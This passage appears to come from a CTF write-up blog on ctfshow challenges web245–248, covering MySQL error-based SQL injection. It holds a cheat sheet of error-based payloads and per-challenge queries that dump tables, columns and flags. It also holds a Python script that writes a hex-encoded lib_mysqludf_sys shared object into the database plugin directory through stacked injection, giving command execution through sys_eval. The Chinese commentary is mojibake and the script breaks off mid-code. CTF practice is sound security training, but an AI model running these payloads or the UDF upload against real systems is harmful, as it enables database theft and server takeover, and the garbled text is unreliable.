data-language="mysql"><code class="language-mysql">1. floor + rand + group byselect * from user where id&#x3D;1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);select * from user where id&#x3D;1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));2. ExtractValueselect * from user where id&#x3D;1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));3. UpdateXmlselect * from user where id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1));4. Name_Const(&gt;5.0.12)select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;5. Joinselect * from(select * from mysql.user a join mysql.user b)c;select * from(select * from mysql.user a join mysql.user b using(Host))c;select * from(select * from mysql.user a join mysql.user b using(Host,User))c;6. exp()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and Exp(~(select * from (select version())a));7. geometrycollection()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));8. multipoint()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));9. polygon()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));10. multipolygon()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));11. linestring()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));12. multilinestring()&#x2F;&#x2F;mysql5.7è²Œä¼¼ä¸èƒ½ç”¨select * from user where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</code></pre><h4 id="web245-extractvalue"><a href="#web245-extractvalue" class="headerlink" title="web245(extractvalue)"></a>web245(extractvalue)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;æ— è¿‡æ»¤è¿‡æ»¤updatexml</code></pre><p>è¿™é‡Œä½¿ç”¨extractvalue</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å ctfshow_flagsa?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))+--+# æŸ¥åˆ—å flag1?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39;),0x7e))+--+# getFlag?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),5,15),0x7e))+--+?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))+--+</code></pre><h4 id="web246-floor"><a href="#web246-floor" class="headerlink" title="web246(floor)"></a>web246(floor)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ— è¿‡æ»¤</span>è¿‡æ»¤updatexml extractvalue</code></pre><p>è¿™é‡Œä½¿ç”¨floor + rand + group by ä¸»è¦åˆ©ç”¨ä¸»é”®çš„é‡å¤æ¥å®ç°æŠ¥é”™</p><p><a href="https://www.freebuf.com/column/235496.html">MysqlæŠ¥é”™æ³¨å…¥ä¹‹floor(rand(0)*2)æŠ¥é”™åŸç†æ¢ç©¶</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å ctfshow_flags?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a);--+# æŸ¥åˆ—å flag2?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flags&#39; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23# getFlag?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select flag21 from ctfshow_flags1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</code></pre><h4 id="web247-åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥"><a href="#web247-åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥" class="headerlink" title="web247(åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥)"></a>web247(åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ— è¿‡æ»¤</span>è¿‡æ»¤updatexml extractvalue floor</code></pre><p><code>floor()ï¼šå‘ä¸‹å–æ•´</code><br><code>ceil()ï¼šå‘ä¸Šå–æ•´</code><br><code>round()ï¼šå››èˆäº”å…¥</code></p><p>flooræ›¿æ¢æˆå…¶ä»–å–æ•´å‡½æ•°å³å¯</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å ctfshow_flagsa1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# æŸ¥åˆ—å flag?1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39; limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# getFlag1&#39; and (select 1 from (select count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23</code></pre><h4 id="web248-udfæ³¨å…¥"><a href="#web248-udfæ³¨å…¥" class="headerlink" title="web248(udfæ³¨å…¥)"></a>web248(udfæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><p>mysqlçš„UAFæ³¨å…¥,ç®€å•æ¥è¯´å°±æ˜¯æŠŠdllæ–‡ä»¶å†™åˆ°ç›®æ ‡æœºå­çš„pluginç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ˜¯å¯ä»¥é€šè¿‡select @@plugin_diræ¥å¾—åˆ°çš„ã€‚æ­¤å¤–å°±æ˜¯è¿™é¢˜å¯ä»¥å †å æ³¨å…¥ï¼Œæˆ‘ä¸€å¼€å§‹æ²¡æƒ³åˆ°å¯ä»¥å †å ï¼Œä»¥ä¸ºæ˜¯å¸ƒå°”ï¼Œå…¶å®è¿˜æ˜¯æ²¡ç†è§£è¿™ä¸ªUAFæ³¨å…¥ï¼Œæœ€åçš„å¯¼å…¥å‡½æ•°è¿™é‡Œï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- -æŸ¥å‡ºMysqlæ’ä»¶è·¯å¾„ï¼š&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+å¼•å…¥udf.soæ–‡ä»¶ä»è€Œåˆ›å»ºå‡½æ•°sys_eval</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;; &#x2F;&#x2F;å¯¼å…¥udfå‡½æ•°</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsbase_url <span class="token operator">=</span> <span class="token string">"https://49e6bca5-e443-47a8-9a15-8619fb62730f.challenge.ctf.show/api/"</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">]</span>udf <span class="token operator">=</span> <span class="token string">"7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">21510</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    end <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">5000</span>    payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> t <span class="token keyword">in</span> text<span class="token punctuation">:</span>    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select unhex('&#123;&#125;') into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+&amp;page=1&amp;limit=10"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        p<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>  <span class="token comment"># UDFææƒä¸€èˆ¬é…åˆdumpfile è€Œä¸æ˜¯outfile</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>next_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># å°†å„ä¸ªtxtæ–‡ä»¶åˆå¹¶åˆ°udf.so</span>rn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token 